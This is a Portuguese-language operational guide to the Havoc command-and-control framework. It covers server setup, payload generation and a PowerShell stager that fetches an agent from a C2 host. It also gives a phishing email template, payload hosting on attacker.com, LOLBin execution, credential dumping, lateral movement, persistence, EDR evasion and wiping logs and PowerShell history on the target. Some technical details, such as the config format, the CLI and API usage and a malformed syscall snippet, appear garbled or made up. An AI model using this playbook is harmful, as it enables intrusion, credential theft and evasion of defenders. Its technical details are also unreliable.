# ⚡ C2 Communication Experiments — HAVOC Framework

Documentação completa para setup e operação do **HAVOC C2 Framework**: Command & Control moderno com suporte a evasão de EDR/AV, comunicação encoberta e operações de red team.

---

## 📋 Índice

- [O que é HAVOC?](#o-que-é-havoc)
- [Pré-Requisitos](#pré-requisitos)
- [Instalação Server](#instalação-server)
- [Configuração do Servidor](#configuração-do-servidor)
- [Geração de Payloads](#geração-de-payloads)
- [Setup Client (Beacon)](#setup-client-beacon)
- [Operações Básicas](#operações-básicas)
- [Técnicas de Evasão](#técnicas-de-evasão)
- [OPSEC & Segurança](#opsec--segurança)

---

## 🎯 O que é HAVOC?

**HAVOC** é um C2 framework de código aberto (successor do Cobalt Strike em funcionalidades):

- ✅ Multiplataforma (Linux, Windows, macOS)
- ✅ Suporte a múltiplos payloads e comunicação encoberta
- ✅ Modular e extensível
- ✅ Evasão de EDR/AV integrada
- ✅ API RESTful para automação
- ✅ Usado em red teams profissionais

**Casos de uso:**
- Simular adversários APT
- Testes de detecção de C2
- Red Team exercises
- Pesquisa de segurança ofensiva

---

## 🔧 Pré-Requisitos

### Sistema Operacional
- **Server HAVOC**: Linux (Debian/Ubuntu preferred) ou Windows
- **Agentes**: Windows 7+, Windows Server 2008+, Linux, macOS

### Dependências
```bash
# Ubuntu/Debian
sudo apt update && sudo apt install -y \
  build-essential \
  golang-1.21 \
  git \
  mingw-w64 \
  nasm \
  netcat-openbsd \
  curl

# Golang
export PATH=$PATH:/usr/lib/go-1.21/bin
```

### Networking
- IP da máquina C2 (servidor HAVOC)
- Domínio dedicado ou IP público (preferível)
- Firewall aberto na porta HTTPS (443, ou customizada)
- Certificado SSL/TLS (self-signed ou válido)

---

## 📦 Instalação Server

### 1. Clonar Repositório HAVOC
```bash
git clone https://github.com/C5pider/Havoc.git
cd Havoc
```

### 2. Compilar Servidor
```bash
cd teamserver

# Build do teamserver (servidor C2)
go mod download
go build -o havoc-teamserver

# Verificar build
./havoc-teamserver --help
```

### 3. Preparar Certificado SSL
```bash
# Self-signed certificate (32 anos de validade)
openssl req -new -x509 -keyout cert.key -out cert.crt -days 11680 -nodes \
  -subj "/C=US/ST=State/L=City/O=Organization/CN=c2.domain.com"

# Converter para formato esperado
cat cert.crt cert.key > havoc.crt
chmod 600 havoc.crt
```

### 4. Arquivo de Configuração Server

Criar `teamserver.yaml`:

```yaml
Teamserver:
  Host: 0.0.0.0
  Port: 443
  Certificate: ./havoc.crt

Operators:
  - Name: redteam
    Password: "SuperSecurePassword123!"

Listener:
  Type: http
  Host: c2.domain.com       # Domínio real ou IP
  Port: 443
  Secure: true              # HTTPS
  UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  Proxy: false
  ProxyURL: ""
```

---

## 🚀 Configuração do Servidor

### Iniciar Servidor HAVOC
```bash
./havoc-teamserver -c teamserver.yaml -v
```

### Verificar Inicialização
```bash
# Em outro terminal
nc -zv c2.domain.com 443

# Deve retornar: Connection to c2.domain.com port 443 [tcp/https] succeeded!
```

### Cliente (CLI) - Conectar ao Server
```bash
# Compilar CLI client
cd ../Client
make

# Conectar
./havoc-client -l c2.domain.com:443 -u redteam -p "SuperSecurePassword123!"
```

---

## 💣 Geração de Payloads

### Opção 1: Via Cliente Interativo (Havoc CLI)
```
[*] Type 'help' for a list of commands
havoc > generate agent

[*] Select agent type:
  1. Windows DLL (Shellcode)
  2. Windows Executable
  3. Windows Service Binary
  4. Linux ELF

havoc > 2  # Windows Executable

[*] Obfuscation:
  1. None
  2. XOR
  3. AES-256

havoc > 3  # AES-256 (máxima evasão)

[+] Beacon generated: beacon.exe
```

### Opção 2: Geração via API RESTful
```bash
curl -X POST https://c2.domain.com/api/v1/payload/generate \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "windows",
    "format": "exe",
    "obfuscation": "aes",
    "listener": "default"
  }' > beacon.exe
```

### Opção 3: PowerShell Stager (Evasão Avançada)
```powershell
# Stager que baixa agent encriptado
$url = "https://c2.domain.com/payload/beacon.enc"
$key = "...[AES_KEY]..."

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$enc = (New-Object System.Net.WebClient).DownloadData($url)
$dec = [System.Security.Cryptography.AesCryptoServiceProvider]::Create()
# ...decrypt e execute...
```

---

## 🎯 Setup Client (Beacon)

### Entregar Payload

#### Método 1: Phishing Email
```
Assunto: Important Security Update
Anexo: beacon.exe (ou .scr, .msi para bypass)
Corpo: "Please run the attached software update immediately"
```

#### Método 2: Hospedagem Web
```bash
# Servidor HTTP simples
python3 -m http.server 8080

# Consumidor acessa:
# http://attacker.com/beacon.exe
```

#### Método 3: Compartilhamento SMB
```bash
# Criar share no servidor C2
mkdir /tmp/share
smbserver.py -smb2support SHARE /tmp/share

# Alvo acessa via UNC path:
# \\attacker.com\share\beacon.exe
```

### Execução do Beacon no Alvo

#### Execução Direta
```cmd
C:\> beacon.exe
```

#### Execução via LOLBin (Living off the Land)
```cmd
# Via regsvcs (Regsvc.exe)
C:\> regsvcs.exe beacon.dll

# Via InstallUtil
C:\> C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe beacon.exe

# Via Rundll32 (se beacon.dll)
C:\> rundll32.exe beacon.dll,EntryPoint
```

#### Execução via PowerShell (Reflexivo)
```powershell
# Carregar agent em memória sem tocar disco
$buf = [System.IO.File]::ReadAllBytes('beacon.exe')
[System.Reflection.Assembly]::Load($buf)
```

---

## 🎮 Operações Básicas

### Comandos Iniciais no Cliente HAVOC

```bash
# 1. Listar sessions conectadas
sessions

# 2. Interagir com beacon específico
use <session_id>

# 3. Info do alvo
info

# 4. Execução de Comandos
shell whoami
shell ipconfig /all

# 5. Leitura de arquivos
cat C:\Windows\System32\drivers\etc\hosts

# 6. Listar processos
ps

# 7. Injetar em processo (Process Hollowing)
inject <pid> beacon.dll
```

### Post-Exploitation Avançada
```bash
# Dump de credenciais (Mimikatz-style)
creds

# Enumerate Active Directory
domain

# Lateral Movement
psexec <target> beacon.exe

# Privilege Escalation
elevate UAC

# Persistence (Registry RUN key)
persistence run registry 
```

---

## 🛡️ Técnicas de Evasão

### 1. Obfuscação de Payload

#### String Obfuscation
```bash
# HAVOC aplica automaticamente via geração
# Strings críticas são offuscadas ao compilar
```

#### Code Cave Injection
```bash
# Injetar shellcode em seção válida do binário
# Reduz detecção por assinatura
```

### 2. Evasão de EDR/AV

#### Syscall Hooking Bypass
```c
// Usar NtOpenProcess direto (via syscall)
// Evita EDR hooks em Win32 APIs
#include <ntdef.h>

__syscall int NtOpenProcess(...) {
    // Chamada direta ao kernel
}
```

#### Parent Process Spoofing
```powershell
# Fazer beacon parecer filial de explorer.exe
# Evasão de detecção comportamental
```

#### Memory Evasion
```bash
# Beacon criptografa seções de código em memória
# Descriptografa just-in-time durante execução
# Bypass de varredura de memória do EDR
```

### 3. Comunicação Encoberta

#### HTTP Beaconing
```yaml
# Tráfego parece legítimo (HTTPS normal)
Listener:
  Protocol: HTTP
  UserAgent: "Mozilla/5.0 Chrome/120"
  JitterMin: 5         # Jitter 5-15 segundos
  JitterMax: 15
  Timeout: 30
```

#### DNS Tunneling
```bash
# Exfiltrar dados via DNS (lento mas discreto)
# Beacon consulta c2.domain.com periodicamente
```

#### HTTPS com Certificate Pinning
```bash
# Cliente valida certificado específico
# Man-in-the-middle não consegue interceptar
```

---

## 🔐 OPSEC & Segurança

### Checklist OPSEC

- ✅ Usar domínio legítimo ou hosting rápido (AWS redirect)
- ✅ Certificado SSL válido (não self-signed óbvio)
- ✅ Jitter nas comunicações (não beacons sincronizados)
- ✅ User-Agent realista (não padrão)
- ✅ Limpar logs do servidor após operação
- ✅ Usar VPN/Proxy para conexão do operador
- ✅ Destruir payloads após entrega
- ✅ Monitorar detecções de EDR em tempo real

### Logging & Limpeza
```bash
# Logs do HAVOC (servidor)
tail -f ./logs/teamserver.log

# Limpar logs após operação
rm -rf ./logs/*
rm -rf ./artifacts/*

# No alvo: limpar Powershell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
```

### Detecção por Defesa

Indícadores que defesa pode detectar:
- Comunicação HTTPS para IP desconhecido
- User-Agent suspeito ou padrão
- Processos filhos anormais (regsvcs, InstallUtil)
- Injeção de processo
- Acesso a LSASS
- Lateral movement (PsExec)

**Mitigação:**
- Usar técnicas avançadas de evasão
- Alternar listeners (HTTP, DNS, HTTPS)
- Sleep entre beacons
- Validar cada ação com OPSEC em mente

---

## 📚 Referências

- [HAVOC GitHub](https://github.com/C5pider/Havoc)
- [Documentação HAVOC](https://havoc.gitbook.io/)
- [Cyber Kill Chain - Lockheed Martin](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [MITRE ATT&CK - Command & Control](https://attack.mitre.org/tactics/TA0011/)
- [EDR Evasion Techniques](https://outflank.nl/blog/)

---

## ⚠️ Aviso Legal

Este material é **exclusivamente para fins educacionais e testes autorizados** em ambientes de red team controlados. Acesso não autorizado a sistemas é crime.

Apenas use em:
- ✅ Laboratórios próprios
- ✅ Engajamentos pentesting autorizados
- ✅ Competições CTF
- ✅ Pesquisa acadêmica com consentimento
